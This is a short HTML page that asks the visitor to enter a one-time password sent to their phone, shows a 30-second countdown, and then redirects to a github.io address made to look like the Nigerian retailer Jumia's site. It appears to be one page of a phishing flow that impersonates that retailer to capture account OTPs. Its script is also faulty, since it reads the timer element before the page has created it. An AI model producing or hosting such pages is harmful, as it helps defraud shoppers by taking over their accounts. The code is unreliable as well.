<!DOCTYPE html>
<html>
  <head>
    <title>OTP Countdown</title>
    <script>
      // Set the duration of the countdown in seconds
      const duration = 30;
      
      // Get the countdown timer element from the HTML
      const countdownTimer = document.getElementById('countdown-timer');
      
      // Update the countdown timer every second
      const interval = setInterval(() => {
        // Calculate the time remaining in the countdown
        const now = new Date().getTime();
        const remaining = Math.max(0, duration - Math.floor((now - startTime) / 1000));
        
        // Format the time remaining as seconds
        const formattedTime = `${remaining} seconds`;
        
        // Update the countdown timer element with the formatted time
        countdownTimer.innerHTML = formattedTime;
        
        // Stop the countdown timer and redirect to URL when the duration has elapsed
        if (remaining === 0) {
          clearInterval(interval);
          window.location.href = 'https://jumia-ng-electronics-category-nig.github.io/jumia.com.ng/index2.html';
        }
      }, 1000);
      
      // Get the current time as the start time for the countdown
      const startTime = new Date().getTime();
    </script>
  </head>
  <body>
    <h1>Enter your OTP</h1>
    <p>A one-time password (OTP) has been sent to your mobile phone. Please enter the OTP below:</p>
    <input type="text" placeholder="OTP">
    <p>Your OTP will expire in <span id="countdown-timer">30 seconds</span>.</p>
  </body>
</html>
